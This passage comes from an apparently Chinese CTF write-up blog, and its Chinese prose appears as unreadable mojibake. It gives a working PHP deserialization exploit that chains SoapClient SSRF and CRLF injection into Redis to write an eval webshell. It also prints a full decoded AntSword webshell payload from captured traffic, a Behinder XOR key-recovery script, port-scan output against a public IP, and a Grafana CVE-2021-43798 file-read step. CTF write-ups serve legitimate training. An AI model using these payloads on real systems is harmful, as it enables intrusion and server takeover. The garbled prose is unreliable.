        $this-&gt;l61q4cheng = $l61q4cheng;
        $this-&gt;love = $love;
    }
    public function newnewnew(){
        $this-&gt;love = new $this-&gt;wllm($this-&gt;arsenetang,$this-&gt;l61q4cheng);
    }

    public function flag(){
        $this-&gt;love-&gt;getflag();
    }
    
    public function __destruct(){
        $this-&gt;newnewnew();
        $this-&gt;flag();
    }
}
class hint{
    public $hint;
    public function __destruct(){
        echo file_get_contents($this-&gt; hint.'hint.php');
    }
}
$hello = $_GET['hello'];
$world = unserialize($hello);  
</code></pre>
<p>é¦–å…ˆæ‰“ä¸€ä¸ªååºåˆ—åŒ–æ‹¿ä¸€ä¸‹hint</p>
<pre><code class="language-php">&lt;?php
class hint{
	public $hint;
	public function __construct($hint){
		$this-&gt;hint = $hint;
	}
}
$h = new hint(&quot;php://filter/read=convert.base64-encode/resource=&quot;);
echo serialize($h);
echo urlencode(serialize($h));
</code></pre>
<p>å¾—åˆ°hint</p>
<pre><code class="language-php">&lt;?php
	$hint = &quot;My favorite database is Redis and My favorite day is 20220311&quot;;
?&gt;
</code></pre>
<p>åç«¯æœ‰Redisæ•°æ®åº“ï¼Œå¹¶ä¸”å‘Šè¯‰äº†æˆ‘ä»¬å¯†ç </p>
<p>å¯ä»¥çœ‹åˆ°åœ¨</p>
<pre><code>public function newnewnew(){
        $this-&gt;love = new $this-&gt;wllm($this-&gt;arsenetang,$this-&gt;l61q4cheng);
    }
</code></pre>
<p>æˆ‘ä»¬å¯ä»¥æ„é€ ä¸€ä¸ªä»»æ„ç±»ï¼Œé‚£ä¹ˆå¯ä»¥å°è¯•è°ƒç”¨åŸç”Ÿç±»<strong>SoapClient</strong>ï¼Œé€ æˆSSRFï¼Œæ¥æ‰“Redis</p>
<p>ä½ç‰ˆæœ¬çš„Redisä¼šå°†è¯·æ±‚å¤´çš„å†…å®¹ä½œä¸ºrediså‘½ä»¤è§£æï¼Œé‚£ä¹ˆåªè¦æˆ‘ä»¬é€šè¿‡CRLFæ§åˆ¶ä½è¯·æ±‚å¤´ï¼Œå†é…åˆSoapClientå‘èµ·è¯·æ±‚å³å¯</p>
<p>expï¼š</p>
<pre><code class="language-php">&lt;?php
$target='http://127.0.0.1:6379/';  //Redisçš„é»˜è®¤ç«¯å£
$poc0=&quot;AUTH 20220311&quot;;  //ç™»å…¥
$poc=&quot;CONFIG SET dir /var/www/html&quot;;  //åœ¨æ— éœ€é‡å¯Redisçš„æƒ…å†µä¸‹è®¾ç½®å·¥ä½œç›®å½•
//å†™æ–‡ä»¶
$poc1=&quot;SET x '&lt;?@eval(\$_POST[1]);?&gt;'&quot;;  //è®¾ç½®ä¸€ä¸ªé”®æ¥ä¿å­˜å­—ç¬¦ä¸²
$poc2=&quot;CONFIG SET dbfilename cmd.php&quot;;
$poc3=&quot;SAVE&quot;;
$a = array('location' =&gt; $target,'uri' =&gt; 'hello^^'.$poc0.'^^'.$poc.'^^'.$poc1.'^^'.$poc2.'^^'.$poc3.'^^hello');
$aaa = serialize($a);
$aaa = str_replace('^^',&quot;\r\n&quot;,$aaa);
$c=unserialize($aaa);
class swpu{
    public $wllm = 'SoapClient';
    public $arsenetang = null;
    public $l61q4cheng;
    public $love;
}
$a=new swpu();
$a-&gt;l61q4cheng=$c;
echo urlencode(serialize($a));
?&gt;
</code></pre>
<p>æŒ‚ä¸Šé©¬åå†ç”¨èšå‰‘è¿æ¥ï¼Œæœ€åsuidææƒ</p>
<h3 id="å…³äºcrlf">å…³äºCRLF</h3>
<p>https://www.php.cn/php-weizijiaocheng-491990.html</p>
<pre><code>&lt;?php
$a = new SoapClient(null, arry(
'location' =&gt; 'http://127.0.0.1:6379',
'uri' =&gt; 'uri',
'user_agent' =&gt; &quot;111111\r\nCookie: PHPSESSION=321321313&quot;
));
$b = serialize($a);
echo $b;
$c = unserialize($b);
$c-&gt;a();
</code></pre>
<p>å¯ä»¥åœ¨uriæˆ–è€…user_agentç­‰å­—æ®µä¸­ï¼Œé€šè¿‡\r\næ¥æ’å…¥å¤šä¸ªè¯·æ±‚å¤´ï¼Œå½¢æˆCRLFæ³¨å…¥</p>
<p>å…³äºRediså‘½ä»¤</p>
<p>https://redis.io/commands/</p>
<h1 id="misc">misc</h1>
<h2 id="æ»´æ»´å›¾">æ»´æ»´å›¾</h2>
<p>é™„ä»¶æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œä»¥åŠä¸€ä¸ª zipæ–‡ä»¶ï¼Œæ˜¾ç„¶æ˜¯å›¾ç‰‡éšè—äº†å¯†ç </p>
<p>ç”¨winhexæ‰“å¼€ï¼Œå¯ä»¥åœ¨æœ€ä¸‹é¢çœ‹åˆ°ä¸€ä¸ªå¯†ç this_is_paSS</p>
<p>ç”¨binwalkåˆ†ç¦»ä¸€ä¸‹å›¾ç‰‡ï¼Œå‘ç°æœ‰ä¸¤ä¸ªå‹ç¼©åŒ…ï¼Œç”¨è¿™ä¸ªå¯†ç å¯ä»¥è§£å¼€</p>
<p>é‡Œé¢æ˜¯ä¸¤å¼ ä¸€æ ·çš„å›¾ç‰‡ï¼Œå‘ç°CRCæ ¡éªŒæœ‰é—®é¢˜ï¼Œä¿®æ”¹äº†ä¸€ä¸‹å®½é«˜ï¼Œå¾—åˆ°å¦ä¸€ä¸ªå¯†ç </p>
<p>è§£å‹æœ€å¼€å§‹çš„å‹ç¼©åŒ…å¯ä»¥å¾—åˆ°éŸ³é¢‘æ–‡ä»¶ï¼Œå‘ç°æ˜¯ä¸€æ®µæ‘©æ–¯å¯†ç </p>
<p>è§£å‡ºflag</p>
<h2 id="ez_xxd">ez_xxd</h2>
<p>é¦–å…ˆæ˜¯ä¸€ä¸ªæµé‡åŒ…ï¼Œå…ˆè¿‡æ»¤å‡ºhttpæµé‡ï¼Œå‘ç°æœ‰ä¸€ä¸ªflag.txtå’Œmaybe_today.zip</p>
<p>è¿™é‡Œå¯ä»¥åœ¨å“åº”å¤´æ‰¾åˆ°æ•°æ®å—ï¼Œå¯¼å‡ºåˆ†ç»„å­—èŠ‚æµï¼Œäºæ˜¯å°±å¾—åˆ°äº†è¿™ä¸¤ä¸ªæ–‡ä»¶</p>
<p>zipè®¾ç½®äº†å¯†ç ï¼Œäºæ˜¯è€ƒè™‘åœ¨flag.txtä¸Šæ‰¾çº¿ç´¢ï¼Œflag.txtä¸­çš„å†…å®¹æ˜¾ç„¶æ˜¯base64ï¼Œä½†æ˜¯è§£å‡ºæ¥çš„ä¸œè¥¿å¹¶æ²¡æœ‰æ˜æ˜¾çš„ç«¯å€ª</p>
<p>äºæ˜¯ï¼Œçœ‹ä¸€ä¸‹flag.txtçš„æ¥æº</p>
<p>å›åˆ°æµé‡åŒ…ï¼Œè¿½è¸ªä¸€ä¸‹shell.php,å‘ç°æ˜¯ä¸€ä¸ªèšå‰‘æµé‡ï¼Œå…ˆbase64è§£ç </p>
<pre><code class="language-php">g0f49a7f453a2e=wdY2QgIi93d3cvYWRtaW4vbG9jYWxob3N0XzgwL3d3d3Jvb3QiO3h4ZCAtcyAweDA4IC1wIC93d3cvYWRtaW4vbG9jYWxob3N0XzgwL3d3d3Jvb3QvTWlrdS5wbmd8YmFzZTY0PmZsYWcudHh0O2VjaG8gMzFhODM7cHdkO2VjaG8gMjk5ZWNkNWNkYg==&amp;s2f57bf194897a=zdL2Jpbi9zaA==&amp;shell=@ini_set(&quot;display_errors&quot;, &quot;0&quot;);@set_time_limit(0);$opdir=@ini_get(&quot;open_basedir&quot;);if($opdir) {$ocwd=dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);$oparr=preg_split(&quot;/;|:/&quot;,$opdir);@array_push($oparr,$ocwd,sys_get_temp_dir());foreach($oparr as $item) {if(!@is_writable($item)){continue;};$tmdir=$item.&quot;/.722722&quot;;@mkdir($tmdir);if(!@file_exists($tmdir)){continue;}@chdir($tmdir);@ini_set(&quot;open_basedir&quot;, &quot;..&quot;);$cntarr=@preg_split(&quot;/\\\\|\//&quot;,$tmdir);for($i=0;$i&lt;sizeof($cntarr);$i++){@chdir(&quot;..&quot;);};@ini_set(&quot;open_basedir&quot;,&quot;/&quot;);@rmdir($tmdir);break;};};;function asenc($out){return $out;};function asoutput(){$output=ob_get_contents();ob_end_clean();echo &quot;6d&quot;.&quot;fcb&quot;;echo @asenc($output);echo &quot;8c2&quot;.&quot;fa8&quot;;}ob_start();try{$p=base64_decode(substr($_POST[&quot;s2f57bf194897a&quot;],2));$s=base64_decode(substr($_POST[&quot;g0f49a7f453a2e&quot;],2));$envstr=@base64_decode(substr($_POST[&quot;v09c646ce6cb4a&quot;],2));$d=dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);$c=substr($d,0,1)==&quot;/&quot;?&quot;-c \&quot;{$s}\&quot;&quot;:&quot;/c \&quot;{$s}\&quot;&quot;;if(substr($d,0,1)==&quot;/&quot;){@putenv(&quot;PATH=&quot;.getenv(&quot;PATH&quot;).&quot;:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;);}else{@putenv(&quot;PATH=&quot;.getenv(&quot;PATH&quot;).&quot;;C:/Windows/system32;C:/Windows/SysWOW64;C:/Windows;C:/Windows/System32/WindowsPowerShell/v1.0/;&quot;);}if(!empty($envstr)){$envarr=explode(&quot;|||asline|||&quot;, $envstr);foreach($envarr as $v) {if (!empty($v)) {@putenv(str_replace(&quot;|||askey|||&quot;, &quot;=&quot;, $v));}}}$r=&quot;{$p} {$c}&quot;;function fe($f){$d=explode(&quot;,&quot;,@ini_get(&quot;disable_functions&quot;));if(empty($d)){$d=array();}else{$d=array_map('trim',array_map('strtolower',$d));}return(function_exists($f)&amp;&amp;is_callable($f)&amp;&amp;!in_array($f,$d));};function runshellshock($d, $c) {if (substr($d, 0, 1) == &quot;/&quot; &amp;&amp; fe('putenv') &amp;&amp; (fe('error_log') || fe('mail'))) {if (strstr(readlink(&quot;/bin/sh&quot;), &quot;bash&quot;) != FALSE) {$tmp = tempnam(sys_get_temp_dir(), 'as');putenv(&quot;PHP_LOL=() { x; }; $c &gt;$tmp 2&gt;&amp;1&quot;);if (fe('error_log')) {error_log(&quot;a&quot;, 1);} else {mail(&quot;a@127.0.0.1&quot;, &quot;&quot;, &quot;&quot;, &quot;-bv&quot;);}} else {return False;}$output = @file_get_contents($tmp);@unlink($tmp);if ($output != &quot;&quot;) {print($output);return True;}}return False;};function runcmd($c){$ret=0;$d=dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);if(fe('system')){@system($c,$ret);}elseif(fe('passthru')){@passthru($c,$ret);}elseif(fe('shell_exec')){print(@shell_exec($c));}elseif(fe('exec')){@exec($c,$o,$ret);print(join(&quot;
&quot;,$o));}elseif(fe('popen')){$fp=@popen($c,'r');while(!@feof($fp)){print(@fgets($fp,2048));}@pclose($fp);}elseif(fe('proc_open')){$p = @proc_open($c, array(1 =&gt; array('pipe', 'w'), 2 =&gt; array('pipe', 'w')), $io);while(!@feof($io[1])){print(@fgets($io[1],2048));}while(!@feof($io[2])){print(@fgets($io[2],2048));}@fclose($io[1]);@fclose($io[2]);@proc_close($p);}elseif(fe('antsystem')){@antsystem($c);}elseif(runshellshock($d, $c)) {return $ret;}elseif(substr($d,0,1)!=&quot;/&quot; &amp;&amp; @class_exists(&quot;COM&quot;)){$w=new COM('WScript.shell');$e=$w-&gt;exec($c);$so=$e-&gt;StdOut();$ret.=$so-&gt;ReadAll();$se=$e-&gt;StdErr();$ret.=$se-&gt;ReadAll();print($ret);}else{$ret = 127;}return $ret;};$ret=@runcmd($r.&quot; 2&gt;&amp;1&quot;);print ($ret!=0)?&quot;ret={$ret}&quot;:&quot;&quot;;;}catch(Exception $e){echo &quot;ERROR://&quot;.$e-&gt;getMessage();};asoutput();die();&amp;v09c646ce6cb4a=LI
</code></pre>
<p>ç¬¬ä¸€ä¸ªå‚æ•°g0f49a7f453a2e,è¿½è¸ªä¸€ä¸‹</p>
<pre><code>$s=base64_decode(substr($_POST[&quot;g0f49a7f453a2e&quot;],2))
</code></pre>
<p>å¯ä»¥çœ‹åˆ°å¯¹è¿™ä¸ªä¼ å‚çš„å¤„ç†ï¼Œæ˜¯å»æ‰äº†å‰ä¸¤ä½ç„¶åå†base64è§£ç </p>
<p>æ‰€ä»¥å®‰è£…è¿™ç§æ–¹å¼è¿›è¡Œè§£ç </p>
<pre><code>cd &quot;/www/admin/localhost_80/wwwroot&quot;;xxd -s 0x08 -p /www/admin/localhost_80/wwwroot/Miku.png|base64&gt;flag.txt;echo 31a83;pwd;echo 299ecd5cdb
</code></pre>
<p>xxdå‘½ä»¤å°†pngçš„åå…­è¿›åˆ¶ä»0X08åç§»å¼€å§‹base64åŠ å¯†ï¼Œä¹Ÿå°±æ˜¯å»æ‰å‰å‰é¢8ä¸ªå­—èŠ‚ï¼Œæˆ–è€…è¯´å°±æ˜¯å»æ‰äº†pngçš„æ–‡ä»¶å¤´</p>
<p>æ‰€ä»¥ï¼Œæˆ‘ä»¬å¯ä»¥base64è§£ç åå†æ‰‹åŠ¨åŠ ä¸Šæ–‡ä»¶å¤´</p>
<p>æˆ–è€…å†™ä¸€ä¸ªè„šæœ¬ï¼š</p>
<pre><code class="language-python">import base64
f = open(&quot;flag.txt&quot;, 'r')
png = open('flag1.txt', 'ab+')
new = open('new.png', 'wb+')
png.write(b'89504e470d0a1a0a')
for line in f.readlines():
    png.write(base64.b64decode(line).replace(b'\n', b''))
png.close()
flag = open('flag.txt', 'r')
new.write(bytes.fromhex(flag.read()))
f.close()
flag.close()
new.close()
</code></pre>
<p>æœ€ç»ˆå¾—åˆ°Miku.pngè¿™å¼ å›¾ç‰‡ï¼Œä¸éš¾å‘ç°è¿™ä¸ªå›¾ç‰‡å’Œä¹‹å‰å‹ç¼©åŒ…é‡Œçš„å›¾ç‰‡å¤§å°ä¸€æ ·ï¼ŒCRCä¸€æ ·ï¼Œä¹Ÿå°±æ˜¯è¯´å¯ä»¥è¿›è¡Œæ˜æ–‡çˆ†ç ´</p>
<p>çˆ†ç ´åï¼Œå¾—åˆ°çš„æ˜¯ä¸€ä¸ªå‰ç«¯å°æ¸¸æˆï¼Œåœ¨SceneManager.jsä¸­æ‰¾åˆ°ä¸€ä¸ªkey</p>
<p>sWxSAnweQIES46L</p>
<p>ç„¶åè¿˜æœ‰æ•°æ®åº“çš„åŸå§‹æ–‡ä»¶ï¼Œå¯ä»¥æ”¾åˆ°mysqlçš„dataè·¯å¾„ä¸‹ï¼Œç„¶åèµ·mysqlæœåŠ¡ï¼Œç”¨navicatè¿ä¸Šå°±èƒ½çœ‹åˆ°ä¸€æ®µbase64ï¼Œè§£ç åæ˜¯ä¸€ä¸ªpkæ–‡ä»¶å¤´ï¼Œç›´æ¥ä¿å­˜zipæ–‡ä»¶</p>
<p>ç”¨åˆšåˆšçš„keyè§£å‹ï¼Œå¾—åˆ°å¦ä¸€ç«¯å¯†æ–‡</p>
<pre><code>~å‘œå—·å—·å—·å—·å‘œå‘œå•Šå—·å‘œå‘œå—·å‘œå‘œ~å—·å—·å‘œå•Šå—·å•Šå‘œ~~~å—·~å—·~å‘œå—·å‘œå—·å‘œå—·å—·å—·å‘œå‘œå•Šå—·å—·å‘œå—·å‘œå‘œå•Š~å•Š~å•Šå—·å•Šå‘œå—·å—·~å•Š~å—·~å‘œå‘œå‘œå•Šå‘œå—·å—·å—·å‘œå‘œå•Šå—·å‘œå‘œå—·å‘œå‘œ~å—·å—·å‘œå•Šå—·å•Šå‘œ~å•Šå•Šå—·~å—·~å‘œå—·å‘œå—·å•Šå—·å—·å—·å‘œå‘œå•Šå—·å‘œå‘œå—·å‘œå‘œå•Šå•Šå•Š~å•Šå—·å•Šå‘œ~~å‘œå—·~å—·~å‘œå—·å‘œå—·å‘œå—·å—·å—·å‘œå‘œå•Šå—·å‘œå‘œå—·å‘œå‘œå•Šå‘œå•Šå‘œå•Šå—·å•Šå‘œ~å•Šå‘œå—·~å—·~å‘œå—·å‘œå—·å‘œå—·å—·å—·å‘œå‘œ~~å—·å‘œå—·å‘œå‘œ~å‘œå—·å‘œå•Šå—·å•Šå‘œ~å•Šå•Šå—·~å—·~å‘œå‘œå‘œå‘œå•Šå—·å—·å—·å‘œå‘œå•Šå—·å‘œå‘œå—·å‘œå‘œ~å‘œå—·å‘œå•Šå—·å•Šå‘œ~~å‘œå—·~å—·~å‘œå—·å‘œå—·å‘œå—·å—·å—·å‘œå‘œå•Šå—·å‘œå‘œå—·å‘œå‘œå•Š~å•Š~å•Šå—·å•Šå‘œ~~å—·å‘œ~å—·~å‘œå‘œå—·~å—·å—·å—·å—·å‘œå‘œå•Šå—·å‘œå‘œå—·å‘œå‘œ~å‘œå—·å‘œå•Šå—·å•Šå‘œå—·å—·å‘œå•Š~å—·~å‘œå—·å‘œå—·å‘œå—·å—·å—·å‘œå‘œ~~å‘œå‘œå—·å‘œå‘œ~å—·å—·å‘œå•Šå—·å•Šå‘œå—·å—·~å•Š~å—·~å‘œå—·å‘œå—·å—·å—·å—·å—·å‘œå‘œå•Šå—·å‘œå‘œå—·å‘œå‘œå•Š~~å•Šå•Šå—·å•Šå‘œ~~å‘œå—·~å—·~å‘œå—·å‘œå—·å•Šå—·å—·å—·å‘œå‘œå•Šå—·å‘œå‘œå—·å‘œå‘œ~å‘œå—·å‘œå•Šå—·å•Šå‘œ~~å‘œå—·~å—·~å‘œå‘œå‘œå‘œ~å—·å—·å—·å‘œå‘œå•Šå—·å‘œå‘œå—·å‘œå‘œ~å—·å‘œå—·å•Šå—·å•Šå‘œ~~å—·å—·~å—·~å‘œå—·å‘œå—·å•Šå—·å—·å—·å‘œå‘œå•Šå—·å‘œå‘œå—·å‘œå‘œå•Šå•Šå•Š~å•Šå—·å•Šå‘œ~~å—·å‘œ~å—·~å‘œå‘œå—·~å—·å—·å—·å—·å‘œå‘œå•Šå—·å‘œå‘œå—·å‘œå‘œ~å—·å‘œå—·å•Šå—·å•Šå‘œ~å•Šå•Šå—·~å—·~å‘œå‘œå‘œå•Šå‘œå—·å—·å—·å‘œå‘œå•Šå—·å—·å‘œå—·å‘œå‘œå•Šå•Šå•Š~å•Šå—·å•Šå‘œå—·å—·~å•Š~å—·~å‘œå—·å‘œå—·å‘œå—·å—·å—·å‘œå‘œå•Šå—·å‘œå‘œå—·å‘œå‘œ~å—·å—·å‘œå•Šå—·å•Šå‘œ~~å—·å—·~å—·~å‘œå—·å‘œå—·å•Šå—·å—·å—·å‘œå‘œ~~å‘œå‘œå—·å‘œå‘œå•Šå•Šå•Šå—·å•Šå—·å•Šå‘œ~å‘œå•Šå—·~å—·~å‘œå—·å‘œ~å—·å•Š
</code></pre>
<p>å…½éŸ³è¯‘è€…è§£ç å¾—åˆ°flag</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[bç«™1024å®‰å…¨æ”»é˜²æŒ‘æˆ˜èµ›]]></title>
        <id>https://boooook123.github.io/Artone.github.io/post/b-zhan-1024-an-quan-gong-fang-tiao-zhan-sai/</id>
        <link href="https://boooook123.github.io/Artone.github.io/post/b-zhan-1024-an-quan-gong-fang-tiao-zhan-sai/">
        </link>
        <updated>2022-11-08T06:34:45.000Z</updated>
        <summary type="html"><![CDATA[<p>ç¬¬ä¸€æ¬¡å‚åŠ bç«™çš„1024æŒ‘æˆ˜èµ›ï¼Œå‰å‡ å¤©éƒ½æ‘¸äº†ï¼Œæœ€åå‡ å¤©è¢«é˜Ÿå‹æ‹‰ç€å¼ºè¡Œä¸Šå·ï¼Œæ²¡æƒ³åˆ°æœ€åakäº†ï¼ï¼ï¼ˆåªèƒ½è¯´è¶Ÿçš„å¾ˆèˆ’æœï¼‰<br>
<img src="https://boooook123.github.io/Artone.github.io//post-images/1667889766807.png" alt="" loading="lazy"></p>
]]></summary>
        <content type="html"><![CDATA[<p>ç¬¬ä¸€æ¬¡å‚åŠ bç«™çš„1024æŒ‘æˆ˜èµ›ï¼Œå‰å‡ å¤©éƒ½æ‘¸äº†ï¼Œæœ€åå‡ å¤©è¢«é˜Ÿå‹æ‹‰ç€å¼ºè¡Œä¸Šå·ï¼Œæ²¡æƒ³åˆ°æœ€åakäº†ï¼ï¼ï¼ˆåªèƒ½è¯´è¶Ÿçš„å¾ˆèˆ’æœï¼‰<br>
<img src="https://boooook123.github.io/Artone.github.io//post-images/1667889766807.png" alt="" loading="lazy"></p>
<!-- more -->
<h2 id="é¢˜ç›®ä¸‰">é¢˜ç›®ä¸‰</h2>
<p>æµé‡é¢˜ï¼Œå¾ˆæ˜æ˜¾æ˜¯åœ¨å’Œbehind.phpåšäº¤äº’ï¼Œä¹Ÿå°±æ˜¯ä¸€ä¸ªåé—¨æ–‡ä»¶</p>
<p>ä¼ è¾“çš„æ•°æ®éƒ½è¿›è¡Œäº†åŠ å¯†ï¼Œè¿™é‡Œpayload ç†µå¾ˆå¤§ï¼ŒContent-type è¿˜æ˜¯ appliacation/x-www-form-urlencodedï¼Œå¾ˆæœ‰å¯èƒ½æ˜¯å†°èæµé‡</p>
<p>ä½†æ˜¯ï¼Œæ‰€æœ‰çš„æµé‡ä¸­å¹¶æ²¡æœ‰å‘ç°keyï¼Œå¦‚æœæ˜¯AESåŠ å¯†çš„ï¼Œæ˜¯æ— æ³•è§£çš„ï¼Œæ‰€æœ‰å¤§æ¦‚ç‡æ˜¯ç”¨äº†XORåŠ å¯†</p>
<p>æ£€æµ‹ä»¥åŠè®¡ç®—keyå€¼</p>
<pre><code class="language-python">from base64 import b64decode

phrases = [
    &quot;assert|eval(base64_decode('&quot;.encode(),
    b'&lt;?\n@error_reporting(0);\n\nfunctio',
    b'&lt;?\nfunction main($action, $remot',
    b'&lt;?\n@error_reporting(0);\nset_time',
    b'\nerror_reporting(0);\n\nfunction m',
    b'&lt;?\n@error_reporting(0);\n\n\nfuncti',
    b'&lt;?\nerror_reporting(0);\nfunction ',
    b'@error_reporting(0);\nfunction ma',
    b'&lt;?php\n\n$taskResult = array();\n$p',
    b&quot;&lt;?\nerror_reporting(0);\nheader('C&quot;,
    b'@error_reporting(0);\n\nfunction g',
    b'&lt;?\n@error_reporting(0);\n@set_tim',
  	b'@error_reporting',
]


def xor(l0, l1):
    ret = [chr(ord(chr(a)) ^ ord(chr(b))) for a, b in zip(l0, l1)]
    return &quot;&quot;.join(ret)


def check(cipher):
    cipher = b64decode(cipher)
    for phrase in phrases:
        p0 = phrase[0:16]
        print(p0)
        p1 = phrase[16:]

        c0 = cipher[0:16]
        print(c0)
        c1 = cipher[16:16 + len(p1)]

        k0 = xor(p0, c0)
        print(k0)
        k1 = xor(p1, c1)
        # print(k1)

        if k1 in k0:
            return k0
    return None


cipher = &quot;...&quot;

key = check(cipher)
if key:
    print(&quot;[+]&quot;, cipher[:32], &quot;is XOR Behinder Request!&quot;)
    print(&quot;[+] The Key of Behinder is &quot;, key)
else:
    print(&quot;[-]&quot;, cipher[:32], &quot;not Behinder Request..&quot;)
</code></pre>
<p>å°†å¯†æ–‡ä¸å‡ ä¸ªå¸¸è§çš„ç‰¹å¾å¤´æ¯”å¯¹<br>
æ‹¿åˆ°key=flag3{Beh1_nder}<br>
ç”¨keyå¯ä»¥è§£ç åŠ å¯†æ•°æ®å¾—åˆ°ä¼ è¾“çš„æ˜æ–‡</p>
<p>exp:</p>
<pre><code class="language-python">from base64 import b64decode
def xor(l0, l1):
    ret = [chr(ord(chr(a)) ^ ord(chr(b))) for a, b in zip(l0, l1)]
    return &quot;&quot;.join(ret)
cipher = &quot;...&quot;
cipher = b64decode(cipher)
k0 = b'flag3{Beh1_nder}'
ans = &quot;&quot;
for i in range(100):
    c0 = cipher[16*i:16*(i+1)]
    p0 = xor(k0, c0)
    ans += p0
    print(p0)
print(ans)
</code></pre>
<h2 id="é¢˜ç›®äº”">é¢˜ç›®äº”</h2>
<p>è¿›å…¥ç½‘ç«™åæœ‰ä¸€ä¸ªmsgçš„æç¤º</p>
<pre><code>/etc/server.go
</code></pre>
<p>ç”¨fscanæ‰«ä¸€ä¸‹ç«¯å£</p>
<pre><code>[*] WebTitle:http://101.132.189.74     code:404 len:18     title:None
[*] WebTitle:http://101.132.189.74:8082 code:200 len:3024   title:JFrog
[*] WebTitle:http://101.132.189.74:8081 code:200 len:878    title:None
[*] WebTitle:http://101.132.189.74:8088 code:302 len:29     title:None è·³è½¬url: http://101.132.189.74:8088/login
[*] WebTitle:http://101.132.189.74:8088/login code:200 len:27707  title:Grafana
[+] InfoScan:http://101.132.189.74:8088/login [editor]
</code></pre>
<p>å‘ç°åœ¨8088ç«¯å£æœ‰ä¸€ä¸ªGrafanaä»¥åŠåœ¨8082ç«¯å£æœ‰ä¸€ä¸ªJFrog</p>
<p>Grafana 8.0.0 - 8.3.0å­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ï¼ˆCVE-2021-43798ï¼‰</p>
<p>æ‰€ä»¥å¯ä»¥å°è¯•è¯»å–ä¸€ä¸‹æ–‡ä»¶ï¼ŒæˆåŠŸè¯»å–åˆ°é¢˜ç›®æç¤ºçš„server.goæ–‡ä»¶</p>
<pre><code class="language-go">package server

import (
	&quot;fmt&quot;
	&quot;github.com/andelf/go-curl&quot;
	&quot;github.com/gin-gonic/gin&quot;
	&quot;io&quot;
	&quot;net&quot;
	&quot;net/http&quot;
	&quot;net/url&quot;
	&quot;os&quot;
	&quot;strings&quot;
	&quot;crack5/utils/try&quot;
)


/*func Test(buf []byte, userdata interface{}) bool {
	println(&quot;DEBUG: size=&gt;&quot;, len(buf))
	println(&quot;DEBUG: content=&gt;&quot;, string(buf))
	return true
}*/

func SecCheck(myurl string) bool {
	if strings.Contains(myurl, &quot;@&quot;) || strings.Contains(myurl, &quot;./&quot;) {    //é»‘åå•
		return false
	} else {
		return true
	}
}

func IsInternalIp(host string) bool {
	ipaddr, err := net.ResolveIPAddr(&quot;ip&quot;, host)  //æ ¹æ®åŸŸåæŸ¥ip

	if err != nil {
		fmt.Println(err)
	}

	fmt.Println(ipaddr.IP, ipaddr.Zone)

	if ipaddr.IP.IsLoopback() { // åˆ¤æ–­æ˜¯å¦æ˜¯è¿˜å›åœ°å€ 127.0.0.1
		return true
	}

	ip4 := ipaddr.IP.To4() //è½¬æ¢ä¸ºipv4
	if ip4 == nil {
		return false
	}
	return ip4[0] == 10 ||
		(ip4[0] == 172 &amp;&amp; ip4[1] &gt;= 16 &amp;&amp; ip4[1] &lt;= 31) ||
		(ip4[0] == 169 &amp;&amp; ip4[1] == 254) ||
		(ip4[0] == 192 &amp;&amp; ip4[1] == 168)
}

// è§£å†³è·¨åŸŸé—®é¢˜
func Cors() gin.HandlerFunc {
	return func(c *gin.Context) {
		method := c.Request.Method

		c.Header(&quot;Access-Control-Allow-Origin&quot;, &quot;*&quot;)
		c.Header(&quot;Access-Control-Allow-Headers&quot;, &quot;Content-Type,AccessToken,X-CSRF-Token, Authorization, Token&quot;)
		c.Header(&quot;Access-Control-Allow-Methods&quot;, &quot;POST, GET, OPTIONS&quot;)
		c.Header(&quot;Access-Control-Expose-Headers&quot;, &quot;Content-Length, Access-Control-Allow-Origin, Access-Control-Allow-Headers, Content-Type&quot;)
		c.Header(&quot;Access-Control-Allow-Credentials&quot;, &quot;true&quot;)
		if method == &quot;OPTIONS&quot; {
			c.AbortWithStatus(http.StatusNoContent)
		}
		c.Next()
	}
}


// GetData
func GetData(c *gin.Context) {

	try.Try(func(){
		target, status := c.GetQuery(&quot;t&quot;)  //ä¼ å‚t

		if !status {
			c.JSON(http.StatusOK, gin.H{
				&quot;msg&quot;:&quot;query invalid&quot;,
			})
			return
		}
		if len(target) &gt;= 128 || !SecCheck(target) {  //é•¿åº¦é™åˆ¶ï¼Œé»‘åå•é™åˆ¶
			c.JSON(http.StatusBadRequest, gin.H{
				&quot;msg&quot;:&quot;illage url&quot;,
			})
			return
		}

		u, err := url.Parse(target)  //è§£æ

		if err != nil {
			c.JSON(http.StatusBadRequest, gin.H{   //è§£æé”™è¯¯
				&quot;msg&quot;:&quot;illage url&quot;,
			})
			return
		} else {
			if (u.Scheme != &quot;http&quot; &amp;&amp; u.Scheme != &quot;https&quot;) || IsInternalIp(u.Hostname()) {  //åªæ¥å—httpå’Œhttpsåè®® ipæ£€æµ‹
				c.JSON(http.StatusBadRequest, gin.H{
					&quot;msg&quot;:&quot;illage url&quot;,
				})
				return
			}

			easy := curl.EasyInit()
			defer easy.Cleanup()
			easy.Setopt(curl.OPT_URL, target)
			easy.Setopt(curl.OPT_TIMEOUT, 3)
			easy.Setopt(curl.OPT_FOLLOWLOCATION, false)
			easy.Setopt(curl.OPT_WRITEFUNCTION, func (buf []byte, extra interface{}) bool {
				c.Data(http.StatusOK, &quot;text/html&quot;, buf)
				return true
			})
			err := easy.Perform()
			if err != nil {
				fmt.Printf(&quot;ERROR: %v\n&quot;, err)
				return
			} else {
				c.JSON(http.StatusInternalServerError, nil)
				return
			}
		}
	}).Catch(func() {
		c.JSON(http.StatusBadGateway, nil)
		return
	})

}

func Info(c *gin.Context) {
	c.JSON(http.StatusOK, gin.H{
		&quot;msg&quot;:&quot; /etc/server.go&quot;,
	})
	return
}


//
func LoadUrl(r *gin.Engine) {

	r.Use(Cors())
	r.GET(&quot;/get&quot;, GetData)
	r.GET(&quot;/index&quot;, Info)
}


func RunAdmin() http.Handler {
	gin.DisableConsoleColor()

	f, _ := os.Create(&quot;./logs/server.log&quot;)
	gin.DefaultWriter = io.MultiWriter(f)


	r := gin.Default()

	r.Use(gin.LoggerWithFormatter(func(param gin.LogFormatterParams) string {
		return fmt.Sprintf(&quot;[Crack5-Web] %s - [%s] \&quot;%s %s %s %d %s \&quot;%s\&quot; %s\&quot;\n&quot;,
			param.ClientIP,
